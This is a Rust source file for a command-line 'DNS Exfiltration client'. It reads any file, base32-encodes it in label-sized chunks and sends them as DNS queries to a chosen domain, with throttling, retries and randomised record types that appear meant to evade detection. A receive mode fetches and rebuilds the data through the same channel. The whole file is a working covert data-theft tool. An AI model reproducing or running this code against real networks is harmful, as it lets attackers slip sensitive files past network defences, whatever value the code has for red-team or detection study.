use clap::{Parser, Subcommand};
use futures::stream::{self, StreamExt};
use std::fs;
use log::{error, info};
use simple_logger::SimpleLogger;
use rustleak_lib::{
    dns::*,
    utils::{decode_base32, encode_base32, split_data_into_label_chunks},
};
use std::time::Instant;
use rand::distributions::{Distribution, WeightedIndex};
use rand::thread_rng;
use std::sync::{Arc, Mutex};
use std::collections::HashSet;
const MAX_ATTEMPTS: usize = 10;

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Parser, Debug)]
struct CommonArgs {
    #[arg(short, long)]
    code: String,
    
    #[arg(short, long)]
    filename: String,
    
    #[arg(short, long)]
    domain: String,

    #[arg(short, long, default_value = "4")]
    threads: usize,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Send data
    Send(CommonArgs),
    /// Receive data
    Receive(CommonArgs),
}

#[tokio::main]
async fn main() {
    SimpleLogger::new().init().unwrap();
    let args = Args::parse();
    let resolver = get_resolver();

    info!("Starting DNS Exfiltration client");

    match args.command {
        Commands::Send(common_args) => {
            match fs::read(&common_args.filename) {
            Ok(raw_bytes) => {
                info!("File {} exists and is readable", &common_args.filename);
                let labels = split_data_into_label_chunks(&raw_bytes);
                let encoded_labels = encode_base32(labels);
                let total_labels = encoded_labels.len();
                
                let processed_indices = Arc::new(Mutex::new(HashSet::new()));
                let start_time = Instant::now();
                
                stream::iter(0..total_labels)
                    .map(|_| {
                        let resolver = resolver.clone();
                        let code = common_args.code.clone();
                        let domain = common_args.domain.clone();
                        let encoded_labels = encoded_labels.clone();
                        let processed_indices = Arc::clone(&processed_indices);

                        async move {
                            let index = {
                                let mut indices = processed_indices.lock().unwrap();
                                let next_index = (0..total_labels)
                                    .find(|&i| !indices.contains(&i));
                                
                                if let Some(i) = next_index {
                                    indices.insert(i);
                                    i
                                } else {
                                    return None;
                                }
                            };

                            let label = &encoded_labels[index];
                            let mut attempts = 0;
                            
                            loop {
                                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                                let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, index, total_labels, code, domain);
                        
                                match resolver.lookup(&query, get_random_record_type()).await {
                                    Ok(_) => {
                                        info!("Successfully sent fragment {}/{}", index + 1, total_labels);
                                        break;
                                    },
                                    Err(_) => {
                                        attempts += 1;
                                        if attempts >= MAX_ATTEMPTS {
                                            error!("Failed to send query after {} attempts: {}", MAX_ATTEMPTS, query);
                                            error!("Aborting...");
                                            std::process::exit(1);
                                        }
                                    }
                                }
                            }
                            Some(index)
                        }
                    })
                    .buffer_unordered(common_args.threads)
                    .filter_map(|x| async move { x })
                    .collect::<Vec<_>>()
                    .await;

                let elapsed = start_time.elapsed().as_secs_f32();
                let byte_rate = (raw_bytes.len() as f32) / elapsed;
                info!("Data sent successfully!");
                info!("Average byte rate: {:.1} bytes/s", byte_rate);
            }
            Err(e) => {
                error!("Error reading file: {}", e);
                return;
            }
            };
        }
        Commands::Receive(common_args) => {
            match fs::OpenOptions::new().write(true).create(true).truncate(false).open(&common_args.filename) {
                Ok(_) => info!("File {} is writable", &common_args.filename),
                Err(e) => {
                    error!("Error opening file for writing: {}", e);
                    return;
                }
            };

            let query = format!("DOWNLOAD.{}.{}", common_args.code, common_args.domain);
            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await;

            let total_fragments: usize = match response {
                Ok(lookup) => {
                    let records = lookup.iter().collect::<Vec<_>>();
                    let record_data = records[0].to_string();
                    record_data.parse::<usize>().unwrap_or_else(|_| {
                        error!("Invalid fragment count response: {}", record_data);
                        std::process::exit(1);
                    })
                }
                Err(_) => {
                    error!("Failed to retrieve fragment count.");
                    return;
                }
            };

            info!("Total fragments to download: {}", total_fragments);
            info!("Using {} parallel threads", common_args.threads);

            let start_time = Instant::now();
            let received_data = Arc::new(Mutex::new(vec![None; total_fragments]));
            let processed_indices = Arc::new(Mutex::new(HashSet::new()));

            stream::iter(0..total_fragments)
                .map(|_| {
                    let resolver = resolver.clone();
                    let code = common_args.code.clone();
                    let domain = common_args.domain.clone();
                    let received_data = Arc::clone(&received_data);
                    let processed_indices = Arc::clone(&processed_indices);

                    async move {
                        let seq = {
                            let mut indices = processed_indices.lock().unwrap();
                            let next_seq = (0..total_fragments)
                                .find(|&i| !indices.contains(&i));
                            
                            if let Some(i) = next_seq {
                                indices.insert(i);
                                i
                            } else {
                                return None;
                            }
                        };

                        let mut attempts = 0;
                        while attempts < MAX_ATTEMPTS {
                            let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
                            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;

                            match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
                                Ok(lookup) => {
                                    let records = lookup.iter().collect::<Vec<_>>();
                                    let record_data = records[0].to_string();
                                    let mut data = received_data.lock().unwrap();
                                    data[seq] = Some(record_data);

                                    let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
                                    let elapsed = start_time.elapsed().as_secs_f32();
                                    let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
                                    let remaining = estimated_total - elapsed;
                                    info!(
                                        "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
                                        progress, elapsed, remaining
                                    );
                                    return Some(seq);
                                }
                                Err(_) => {
                                    attempts += 1;
                                }
                            }
                        }
                        error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
                        error!("Aborting...");
                        std::process::exit(1);
                    }
                })
                .buffer_unordered(common_args.threads)
                .filter_map(|x| async move { x })
                .collect::<Vec<_>>()
                .await;

            let elapsed = start_time.elapsed().as_secs_f32();
            let byte_rate = (total_fragments as f32 * 32.0) / elapsed;
            
            let received_data = Arc::try_unwrap(received_data)
                .unwrap()
                .into_inner()
                .unwrap();
            
            let decoded_data = decode_base32(
                received_data.into_iter().flatten().collect(),
            );
            let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
            fs::write(&common_args.filename, flattened_data).expect("Failed to write data to file");
            info!("Data successfully written to file: {}", common_args.filename);
            info!("Average byte rate: {:.1} bytes/s", byte_rate);
        }
    }
}

fn get_random_record_type() -> hickory_resolver::proto::rr::RecordType {
    let record_types = vec![
        hickory_resolver::proto::rr::RecordType::A,
        hickory_resolver::proto::rr::RecordType::AAAA,
        hickory_resolver::proto::rr::RecordType::CNAME,
        hickory_resolver::proto::rr::RecordType::TXT,
    ];

    let weights = vec![30, 30, 30, 10];
    let dist = WeightedIndex::new(&weights).unwrap();
    let mut rng = thread_rng();
    record_types[dist.sample(&mut rng)]
}